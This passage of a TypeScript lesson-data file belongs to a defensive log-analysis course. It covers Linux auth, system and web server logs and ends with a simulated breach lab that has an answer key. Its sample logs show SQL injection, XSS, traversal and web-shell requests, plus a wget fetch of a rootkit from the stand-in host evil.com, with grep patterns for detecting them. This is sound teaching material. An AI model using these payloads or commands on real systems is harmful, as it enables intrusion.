kern.*    /var/log/kern.log

# Forward logs to remote server
*.* @@192.168.1.100:514
\`\`\`

## Log Rotation

Logs are rotated to manage disk space via **logrotate**.

### Configuration: /etc/logrotate.d/rsyslog

\`\`\`
/var/log/syslog
{
    rotate 7
    daily
    missingok
    notifempty
    delaycompress
    compress
    postrotate
        /usr/lib/rsyslog/rsyslog-rotate
    endscript
}
\`\`\`

## Linux Audit System (auditd)

**auditd** provides detailed system call auditing.

### Key Files
- **/etc/audit/auditd.conf** - Daemon configuration
- **/etc/audit/audit.rules** - Audit rules
- **/var/log/audit/audit.log** - Audit log

### Common Audit Rules

\`\`\`bash
# Monitor file access
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity

# Monitor command execution
-a always,exit -F arch=b64 -S execve -k exec

# Monitor network connections
-a always,exit -F arch=b64 -S connect -k network

# Monitor user/group changes
-w /etc/group -p wa -k identity
-w /etc/gshadow -p wa -k identity
\`\`\`

### Reading Audit Logs

\`\`\`bash
# Search audit log
ausearch -k identity

# Generate report
aureport -au

# Watch specific user
ausearch -ua username
\`\`\`

## Useful Commands

\`\`\`bash
# View last logins
last

# View failed logins
lastb

# View currently logged in users
who

# View login history
lastlog

# View system uptime and users
w
\`\`\`
    `,
    keyTakeaways: [
      "Linux stores logs in /var/log with distribution-specific file names",
      "auth.log (Debian) or secure (RHEL) contain authentication events",
      "journalctl is the modern way to query logs on systemd systems",
      "auditd provides detailed system call auditing for security",
      "Understanding syslog facilities and priorities helps filter logs"
    ]
  },
  {
    id: "3.2",
    courseId: "log-analysis",
    title: "Authentication Logs (auth.log/secure)",
    content: `
# Authentication Logs (auth.log/secure)

Authentication logs are the most security-critical logs on Linux systems. They record all login attempts, sudo usage, and PAM events.

## Log Locations

| Distribution | Auth Log Path |
|--------------|---------------|
| Debian/Ubuntu | /var/log/auth.log |
| RHEL/CentOS/Fedora | /var/log/secure |
| SUSE | /var/log/messages |

## SSH Authentication Events

### Successful SSH Login
\`\`\`
Oct 11 10:15:30 server sshd[12345]: Accepted publickey for john from 192.168.1.100 port 54321 ssh2: RSA SHA256:aBcDeFg...
Oct 11 10:15:30 server sshd[12345]: pam_unix(sshd:session): session opened for user john by (uid=0)
\`\`\`

### Failed SSH Login
\`\`\`
Oct 11 10:15:30 server sshd[12345]: Failed password for invalid user admin from 192.168.1.100 port 54321 ssh2
Oct 11 10:15:31 server sshd[12345]: Connection closed by authenticating user admin 192.168.1.100 port 54321 [preauth]
\`\`\`

### SSH Brute Force Pattern
\`\`\`
Oct 11 10:15:30 server sshd[12345]: Failed password for root from 192.168.1.100 port 54321
Oct 11 10:15:31 server sshd[12346]: Failed password for root from 192.168.1.100 port 54322
Oct 11 10:15:32 server sshd[12347]: Failed password for root from 192.168.1.100 port 54323
Oct 11 10:15:33 server sshd[12348]: Failed password for root from 192.168.1.100 port 54324
\`\`\`

## Sudo Events

### Successful Sudo
\`\`\`
Oct 11 10:20:00 server sudo: john : TTY=pts/0 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/apt update
\`\`\`

### Failed Sudo (Wrong Password)
\`\`\`
Oct 11 10:20:00 server sudo: pam_unix(sudo:auth): authentication failure; logname=john uid=1000 euid=0 tty=/dev/pts/0 ruser=john rhost= user=john
Oct 11 10:20:05 server sudo: john : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
\`\`\`

### Unauthorized Sudo Attempt
\`\`\`
Oct 11 10:20:00 server sudo: baduser : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/baduser ; USER=root ; COMMAND=/bin/bash
\`\`\`

## User Account Events

### User Added
\`\`\`
Oct 11 10:25:00 server useradd[12345]: new user: name=newuser, UID=1001, GID=1001, home=/home/newuser, shell=/bin/bash
\`\`\`

### Password Changed
\`\`\`
Oct 11 10:25:30 server passwd[12346]: pam_unix(passwd:chauthtok): password changed for newuser
\`\`\`

### User Added to Group
\`\`\`
Oct 11 10:26:00 server usermod[12347]: add 'newuser' to group 'sudo'
\`\`\`

## PAM Events

PAM (Pluggable Authentication Modules) logs authentication for all services.

### PAM Success
\`\`\`
Oct 11 10:30:00 server sshd[12345]: pam_unix(sshd:session): session opened for user john by (uid=0)
\`\`\`

### PAM Failure
\`\`\`
Oct 11 10:30:00 server sshd[12345]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.100 user=john
\`\`\`

## Detection Patterns

### SSH Brute Force Detection
\`\`\`bash
# Count failed logins by IP
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn

# Find IPs with more than 10 failed attempts
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | awk '$1 > 10'
\`\`\`

### Successful Logins from Unusual IPs
\`\`\`bash
# List all successful logins with source IPs
grep "Accepted" /var/log/auth.log | awk '{print $1, $2, $3, $9, $11}'
\`\`\`

### Sudo Abuse Detection
\`\`\`bash
# Find failed sudo attempts
grep "authentication failure" /var/log/auth.log | grep sudo

# Find users not in sudoers
grep "NOT in sudoers" /var/log/auth.log
\`\`\`

### Unusual Account Activity
\`\`\`bash
# New user creation
grep "useradd" /var/log/auth.log

# Password changes
grep "password changed" /var/log/auth.log

# Group membership changes
grep "to group" /var/log/auth.log
\`\`\`

## Quick Reference: Key Patterns

| Pattern | Indicates |
|---------|-----------|
| "Failed password" | Failed login attempt |
| "Accepted password" | Successful password auth |
| "Accepted publickey" | Successful key auth |
| "invalid user" | Login attempt for nonexistent user |
| "NOT in sudoers" | Unauthorized sudo attempt |
| "session opened" | Login session started |
| "session closed" | Logout |
| "authentication failure" | PAM auth failed |
    `,
    keyTakeaways: [
      "auth.log (Debian) or secure (RHEL) are critical for security monitoring",
      "'Failed password' entries reveal brute force attempts",
      "Sudo logs show privilege escalation attempts",
      "'NOT in sudoers' indicates unauthorized privilege attempts",
      "PAM logs record authentication across all services"
    ],
    practicalExercise: {
      title: "Auth Log Analysis",
      description: "Analyze a sample auth.log file for security events.",
      steps: [
        "Count total failed SSH logins",
        "Identify the top 5 source IPs for failed logins",
        "Find any successful logins after failed attempts",
        "List all sudo commands run as root",
        "Identify any new user accounts created"
      ]
    }
  },
  {
    id: "3.3",
    courseId: "log-analysis",
    title: "System & Application Logs",
    content: `
# System & Application Logs

Beyond authentication, Linux logs system events, service activity, and application behavior that are valuable for security analysis.

## System Logs

### /var/log/syslog or /var/log/messages

General system messages from various sources.

\`\`\`
Oct 11 10:00:00 server systemd[1]: Starting Apache HTTP Server...
Oct 11 10:00:01 server systemd[1]: Started Apache HTTP Server.
Oct 11 10:05:00 server kernel: [UFW BLOCK] IN=eth0 OUT= MAC=... SRC=192.168.1.100 DST=10.0.0.1 ...
\`\`\`

### /var/log/kern.log

Kernel messages including hardware, drivers, and security events.

\`\`\`
Oct 11 10:00:00 server kernel: [   0.000000] Linux version 5.4.0-42-generic
Oct 11 10:05:00 server kernel: usb 1-1: new high-speed USB device number 2
Oct 11 10:10:00 server kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.168.1.100 ...
\`\`\`

**Security-relevant kernel messages:**
- UFW/iptables blocks
- USB device connections
- Segfaults and crashes
- OOM killer events
- SELinux/AppArmor denials

### /var/log/dmesg

Boot-time kernel messages.

\`\`\`bash
# View boot messages
dmesg

# View only errors
dmesg --level=err,warn

# Follow new messages
dmesg -w
\`\`\`

## Service-Specific Logs

### Cron Jobs (/var/log/cron)

\`\`\`
Oct 11 10:00:01 server CRON[12345]: (root) CMD (/usr/local/bin/backup.sh)
Oct 11 10:00:01 server CRON[12346]: (www-data) CMD (php /var/www/cron.php)
\`\`\`

**Security concerns:**
- Unexpected cron jobs (persistence)
- Jobs running as root
- Jobs executing from /tmp or unusual paths

### Package Manager Logs

**Debian/Ubuntu:**
\`\`\`
# /var/log/dpkg.log
2023-10-11 10:00:00 install package-name:amd64 <none> 1.0.0
2023-10-11 10:00:01 status installed package-name:amd64 1.0.0
\`\`\`

**RHEL/CentOS:**
\`\`\`
# /var/log/yum.log or /var/log/dnf.log
Oct 11 10:00:00 Installed: package-name-1.0.0.x86_64
\`\`\`

**Security concerns:**
- Unexpected package installations
- Security tools being removed
- Kernel updates

### Boot Logs (/var/log/boot.log)

Services started during boot.

\`\`\`
Oct 11 10:00:00 server systemd[1]: Starting OpenBSD Secure Shell server...
Oct 11 10:00:01 server systemd[1]: Started OpenBSD Secure Shell server.
\`\`\`

## Application Logs

### Mail Logs (/var/log/mail.log)

\`\`\`
Oct 11 10:00:00 server postfix/smtpd[12345]: connect from unknown[192.168.1.100]
Oct 11 10:00:01 server postfix/smtpd[12345]: NOQUEUE: reject: RCPT from unknown[192.168.1.100]: 554 5.7.1 <admin@target.com>: Relay access denied
\`\`\`

**Security concerns:**
- Spam relay attempts
- Phishing email sources
- Unusual sending patterns

### Database Logs

**MySQL:**
\`\`\`
# /var/log/mysql/error.log
2023-10-11T10:00:00.000000Z 0 [Warning] Access denied for user 'root'@'192.168.1.100' (using password: YES)
\`\`\`

**PostgreSQL:**
\`\`\`
# /var/log/postgresql/postgresql-14-main.log
2023-10-11 10:00:00.000 UTC [12345] FATAL: password authentication failed for user "admin"
\`\`\`

### Container Logs

**Docker:**
\`\`\`bash
# View container logs
docker logs container_name

# Follow logs
docker logs -f container_name

# Logs are stored in:
/var/lib/docker/containers/<container-id>/<container-id>-json.log
\`\`\`

## Security-Relevant Patterns

### Service Crashes
\`\`\`
Oct 11 10:00:00 server kernel: nginx[12345]: segfault at 0 ip 00007f... sp 00007ff...
Oct 11 10:00:00 server systemd[1]: nginx.service: Main process exited, code=killed, status=11/SEGV
\`\`\`

### OOM Killer (Out of Memory)
\`\`\`
Oct 11 10:00:00 server kernel: Out of memory: Killed process 12345 (java) total-vm:8388608kB
\`\`\`

### UFW/iptables Blocks
\`\`\`
Oct 11 10:00:00 server kernel: [UFW BLOCK] IN=eth0 OUT= MAC=... SRC=192.168.1.100 DST=10.0.0.1 LEN=44 TOS=0x00 PREC=0x00 TTL=243 ID=54321 PROTO=TCP SPT=54321 DPT=22 WINDOW=65535
\`\`\`

### AppArmor/SELinux Denials
\`\`\`
Oct 11 10:00:00 server kernel: audit: type=1400 audit(1633954800.000:100): apparmor="DENIED" operation="open" profile="/usr/sbin/apache2" name="/etc/shadow"
\`\`\`

## Analysis Commands

\`\`\`bash
# Find errors in syslog
grep -i "error\\|fail\\|denied\\|block" /var/log/syslog

# Monitor logs in real-time
tail -f /var/log/syslog | grep --line-buffered -i "error"

# Find recent service restarts
journalctl -u "*.service" --since "1 hour ago" | grep -i "start\\|stop"

# View firewall blocks
grep "UFW BLOCK" /var/log/syslog | awk '{print $12}' | cut -d= -f2 | sort | uniq -c | sort -rn
\`\`\`
    `,
    keyTakeaways: [
      "syslog/messages contain general system events from multiple sources",
      "Kernel logs reveal firewall blocks, crashes, and hardware events",
      "Cron logs can expose persistence mechanisms",
      "Package manager logs show software installations and removals",
      "AppArmor/SELinux denials indicate blocked malicious behavior"
    ]
  },
  {
    id: "3.4",
    courseId: "log-analysis",
    title: "Web Server Logs (Apache/Nginx)",
    content: `
# Web Server Logs (Apache/Nginx)

Web server logs are essential for detecting web-based attacks, unauthorized access attempts, and reconnaissance activity.

## Apache Log Locations

| Log Type | Default Path |
|----------|--------------|
| Access Log | /var/log/apache2/access.log |
| Error Log | /var/log/apache2/error.log |
| Virtual Host | /var/log/apache2/vhost-access.log |

## Nginx Log Locations

| Log Type | Default Path |
|----------|--------------|
| Access Log | /var/log/nginx/access.log |
| Error Log | /var/log/nginx/error.log |

## Combined Log Format

Most web servers use the **Combined Log Format**:

\`\`\`
%h %l %u %t "%r" %>s %b "%{Referer}i" "%{User-Agent}i"
\`\`\`

### Example Entry
\`\`\`
192.168.1.100 - john [11/Oct/2023:10:00:00 +0000] "GET /admin/login.php HTTP/1.1" 200 1234 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
\`\`\`

### Field Breakdown

| Field | Value | Description |
|-------|-------|-------------|
| %h | 192.168.1.100 | Client IP address |
| %l | - | Identity (usually -) |
| %u | john | Authenticated username |
| %t | [11/Oct/2023:10:00:00 +0000] | Timestamp |
| %r | "GET /admin/login.php HTTP/1.1" | Request line |
| %>s | 200 | HTTP status code |
| %b | 1234 | Response size in bytes |
| Referer | https://example.com/ | Referring URL |
| User-Agent | Mozilla/5.0... | Client browser/tool |

## HTTP Status Codes for Security

| Code | Meaning | Security Relevance |
|------|---------|-------------------|
| 200 | OK | Successful request |
| 301/302 | Redirect | May indicate redirect attacks |
| 400 | Bad Request | Malformed request, possible attack |
| 401 | Unauthorized | Authentication required/failed |
| 403 | Forbidden | Access denied |
| 404 | Not Found | Scanning for files/directories |
| 500 | Server Error | Possible exploitation attempt |
| 503 | Service Unavailable | Overload, possible DDoS |

## Web Attack Patterns

### SQL Injection Attempts
\`\`\`
192.168.1.100 - - [11/Oct/2023:10:00:00] "GET /search?q=1' OR '1'='1 HTTP/1.1" 200 ...
192.168.1.100 - - [11/Oct/2023:10:00:01] "GET /user?id=1 UNION SELECT * FROM users-- HTTP/1.1" 500 ...
\`\`\`

**Indicators:**
- Single quotes (')
- SQL keywords: UNION, SELECT, INSERT, DROP
- Comment characters: --, #, /*
- OR 1=1 patterns

### XSS Attempts
\`\`\`
192.168.1.100 - - [11/Oct/2023:10:00:00] "GET /search?q=<script>alert('xss')</script> HTTP/1.1" 200 ...
\`\`\`

**Indicators:**
- <script> tags
- javascript: URLs
- Event handlers: onerror, onload
- URL-encoded versions: %3Cscript%3E

### Directory Traversal
\`\`\`
192.168.1.100 - - [11/Oct/2023:10:00:00] "GET /files/../../../etc/passwd HTTP/1.1" 200 ...
\`\`\`

**Indicators:**
- ../ sequences
- URL-encoded: %2e%2e%2f
- Targeting sensitive files: /etc/passwd, /etc/shadow

### Web Shell Access
\`\`\`
192.168.1.100 - - [11/Oct/2023:10:00:00] "POST /uploads/shell.php HTTP/1.1" 200 50
192.168.1.100 - - [11/Oct/2023:10:00:01] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 12
\`\`\`

**Indicators:**
- POST to unusual .php files
- GET with cmd, command, c parameters
- Small response sizes (command output)
- Requests to /uploads, /tmp, /temp directories

### Scanner/Bot Activity
\`\`\`
192.168.1.100 - - [11/Oct/2023:10:00:00] "GET /admin HTTP/1.1" 404
192.168.1.100 - - [11/Oct/2023:10:00:01] "GET /administrator HTTP/1.1" 404
192.168.1.100 - - [11/Oct/2023:10:00:02] "GET /wp-admin HTTP/1.1" 404
192.168.1.100 - - [11/Oct/2023:10:00:03] "GET /phpmyadmin HTTP/1.1" 404
\`\`\`

**Indicators:**
- Rapid 404 sequences
- Common admin paths
- WordPress, Drupal, Joomla paths
- Unusual User-Agents: curl, python-requests, nikto

## Analysis Commands

\`\`\`bash
# Top IPs by request count
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head 20

# Find potential SQL injection
grep -E "(SELECT|UNION|INSERT|DROP|--|'|%27)" access.log

# Find 404 scanners
awk '$9 == 404 {print $1}' access.log | sort | uniq -c | sort -rn | head 20

# Find POST requests (potential uploads/exploits)
grep "POST" access.log | awk '{print $1, $7}' | sort | uniq -c | sort -rn

# Find requests to common attack paths
grep -E "(shell|cmd|exec|eval|upload|admin)" access.log

# Analyze User-Agents
awk -F'"' '{print $6}' access.log | sort | uniq -c | sort -rn | head 20

# Find large responses (possible data exfiltration)
awk '$10 > 1000000 {print $1, $7, $10}' access.log
\`\`\`

## Suspicious User-Agents

| User-Agent | Likely Tool |
|------------|-------------|
| sqlmap | SQL injection tool |
| nikto | Web vulnerability scanner |
| nmap | Port scanner |
| python-requests | Scripted attacks |
| curl | Command-line tool |
| Googlebot (fake) | Impersonation |
    `,
    keyTakeaways: [
      "Combined Log Format provides IP, URL, status, referrer, and User-Agent",
      "404 storms indicate directory/file scanning",
      "SQL injection shows as quotes and SQL keywords in URLs",
      "Web shells have distinctive access patterns (cmd parameters)",
      "Unusual User-Agents often indicate automated attacks"
    ]
  },
  {
    id: "3.5",
    courseId: "log-analysis",
    title: "Hands-On: Linux Log Analysis Challenge",
    content: `
# Hands-On: Linux Log Analysis Challenge

Time to put your Linux log analysis skills to the test! Investigate this simulated breach using only log files.

## Scenario

A web server was compromised. The incident response team has provided you with logs. Your mission:

1. Determine the initial access method
2. Identify attacker activities
3. Document all IOCs
4. Reconstruct the attack timeline

## Log Samples

### auth.log (Authentication Events)

\`\`\`
Oct 11 08:00:15 webserver sshd[12301]: Failed password for root from 203.0.113.50 port 54321 ssh2
Oct 11 08:00:16 webserver sshd[12302]: Failed password for root from 203.0.113.50 port 54322 ssh2
Oct 11 08:00:17 webserver sshd[12303]: Failed password for root from 203.0.113.50 port 54323 ssh2
... (500 more failed attempts from same IP)
Oct 11 08:05:30 webserver sshd[12805]: Accepted password for root from 203.0.113.50 port 55001 ssh2
Oct 11 08:05:30 webserver sshd[12805]: pam_unix(sshd:session): session opened for user root by (uid=0)
Oct 11 08:06:00 webserver useradd[12810]: new user: name=backdoor, UID=1001, GID=1001, home=/home/backdoor, shell=/bin/bash
Oct 11 08:06:05 webserver usermod[12811]: add 'backdoor' to group 'sudo'
Oct 11 08:10:00 webserver sudo: backdoor : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://evil.com/rootkit.tar.gz
\`\`\`

### access.log (Web Server)

\`\`\`
Oct 11 07:30:00 203.0.113.50 - - "GET /admin HTTP/1.1" 404 162
Oct 11 07:30:01 203.0.113.50 - - "GET /wp-admin HTTP/1.1" 404 162
Oct 11 07:30:02 203.0.113.50 - - "GET /administrator HTTP/1.1" 404 162
Oct 11 07:30:03 203.0.113.50 - - "GET /phpmyadmin HTTP/1.1" 200 4523
Oct 11 07:31:00 203.0.113.50 - - "GET /phpmyadmin/index.php?target=db_sql.php%253f/../../../../etc/passwd HTTP/1.1" 200 1847
Oct 11 07:32:00 203.0.113.50 - - "POST /phpmyadmin/import.php HTTP/1.1" 200 523
\`\`\`

### syslog (System Events)

\`\`\`
Oct 11 08:06:30 webserver systemd[1]: Started backdoor.service.
Oct 11 08:06:31 webserver kernel: [UFW ALLOW] IN=eth0 OUT= SRC=203.0.113.50 DST=10.0.0.5 PROTO=TCP SPT=55001 DPT=22
Oct 11 08:08:00 webserver CRON[12850]: (root) CMD (/tmp/.hidden/persist.sh)
Oct 11 08:10:30 webserver kernel: [UFW ALLOW] IN= OUT=eth0 SRC=10.0.0.5 DST=45.33.32.156 PROTO=TCP SPT=45678 DPT=443
\`\`\`

### cron log

\`\`\`
Oct 11 08:07:00 webserver crontab[12840]: (root) REPLACE (root)
Oct 11 08:07:00 webserver crontab[12840]: (root) LIST (root)
\`\`\`

## Investigation Questions

### Question 1: Reconnaissance
What did the attacker do before attempting SSH access?

**Answer:** _______________________

### Question 2: Initial Access (Web)
The attacker found an exposed service. What was it?

**Answer:** _______________________

### Question 3: Vulnerability Exploited
What type of attack was used against phpMyAdmin?

**Answer:** _______________________

### Question 4: Initial Access (SSH)
How did the attacker gain SSH access?

**Answer:** _______________________

### Question 5: Persistence Mechanism 1
What user account was created for persistence?

**Answer:** _______________________

### Question 6: Persistence Mechanism 2
What service was created?

**Answer:** _______________________

### Question 7: Persistence Mechanism 3
What cron job was added?

**Answer:** _______________________

### Question 8: C2 Communication
What IP did the server connect to after compromise?

**Answer:** _______________________

### Question 9: Malware Downloaded
What was the name of the malicious file downloaded?

**Answer:** _______________________

## Attack Timeline

Fill in the timeline:

\`\`\`
07:30:00 ─── ___________________________
    │
07:30:03 ─── ___________________________
    │
07:31:00 ─── ___________________________
    │
08:00:15 ─── ___________________________
    │
08:05:30 ─── ___________________________
    │
08:06:00 ─── ___________________________
    │
08:06:30 ─── ___________________________
    │
08:07:00 ─── ___________________________
    │
08:08:00 ─── ___________________________
    │
08:10:00 ─── ___________________________
    │
08:10:30 ─── ___________________________
\`\`\`

## IOC Extraction

Document all IOCs:

**IP Addresses:**
- ___________________________
- ___________________________

**URLs/Domains:**
- ___________________________
- ___________________________

**File Paths:**
- ___________________________
- ___________________________

**User Accounts:**
- ___________________________

**Services:**
- ___________________________

---

## Answers

1. Web application scanning (404 attempts on /admin, /wp-admin, etc.)
2. phpMyAdmin
3. Path/Directory traversal
4. SSH brute force (500+ failed attempts, then success)
5. "backdoor"
6. backdoor.service
7. /tmp/.hidden/persist.sh
8. 45.33.32.156
9. rootkit.tar.gz

**Timeline:**
\`\`\`
07:30:00 ─── Web scanning begins
07:30:03 ─── phpMyAdmin found (200 response)
07:31:00 ─── Directory traversal exploit
08:00:15 ─── SSH brute force begins
08:05:30 ─── SSH access gained (root)
08:06:00 ─── Backdoor user created, added to sudo
08:06:30 ─── Malicious service started
08:07:00 ─── Cron job modified
08:08:00 ─── Persistence script runs
08:10:00 ─── Malware downloaded
08:10:30 ─── C2 connection established
\`\`\`

**IOCs:**
- IPs: 203.0.113.50 (attacker), 45.33.32.156 (C2)
- URLs: http://evil.com/rootkit.tar.gz
- Paths: /tmp/.hidden/persist.sh
- Users: backdoor
- Services: backdoor.service
    `,
    keyTakeaways: [
      "Correlate logs across auth, web, and system sources for full visibility",
      "Attackers often perform reconnaissance before exploitation",
      "Multiple persistence mechanisms are common (user, service, cron)",
      "Timeline reconstruction reveals the attack sequence",
      "IOC extraction is critical for blocking and hunting"
    ],
    practicalExercise: {
      title: "Write the Incident Report",
      description: "Create a formal incident report from this investigation.",
      steps: [
        "Write an executive summary",
        "Document the attack chain (MITRE ATT&CK mapping)",
        "List all IOCs with context",
        "Provide remediation steps",
        "Suggest detection improvements"
      ]
    }
  }
];

export const getLessonContent = (courseId: string, lessonId: string): LessonContent | undefined => {
  return lessonContents.find(
    (lesson) => lesson.courseId === courseId && lesson.id === lessonId
  );
};

export const getCourseLessons = (courseId: string): LessonContent[] => {
  return lessonContents.filter((lesson) => lesson.courseId === courseId);
};
